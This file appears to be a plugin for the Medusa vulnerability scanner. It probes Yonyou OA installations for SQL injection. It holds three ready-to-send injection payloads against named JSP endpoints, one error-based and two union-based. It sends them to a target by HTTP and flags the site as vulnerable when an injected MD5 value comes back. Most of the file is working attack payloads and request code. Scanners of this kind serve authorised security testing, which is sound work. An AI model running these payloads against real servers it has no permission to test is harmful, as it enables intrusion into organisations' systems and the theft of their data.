#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['disclosure']='2019-10-13'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "SeeyouMultipleSQLInjectionVulnerabilities"  # 插件名称
        self.info['name'] ='用友多处sql注入漏洞' #漏洞名称
        self.info['affects'] = "用友OA"  # 漏洞组件
        self.info['desc_content'] = "用友OA多处sql注入漏洞"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payloads = ["/yyoa/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2%27AnD%20(SeLeCt%201%20FrOm%20(SeLeCt%20CoUnT(*),CoNcaT(Md5(1234),FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.TaBlEs%20GrOuP%20By%20x)a)%23",
                    "/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1'UnIoN%20AlL%20SeLeCt%20NULL,Md5(1234),NULL,NULL%23",
                    "/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20AnD%201=2%20UnIon%20SeLeCt%20Md5(1234)%20--"]
def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=ClassCongregation.Proxies().result(proxies)
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    Medusas=[]
    for payload in payloads:
        try:
            payload_url = scheme+"://"+url+ ':' + str(port)+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            resp = requests.get(payload_url,headers=headers,proxies=proxies, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if  con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
                Medusa = "{} 存在用友OA多处sql注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
                _t = VulnerabilityInfo(Medusas)
                ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
        except Exception as e:
            _ = VulnerabilityInfo('').info.get('algroup')
            ClassCongregation.ErrorHandling().Outlier(e, _)
            _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类
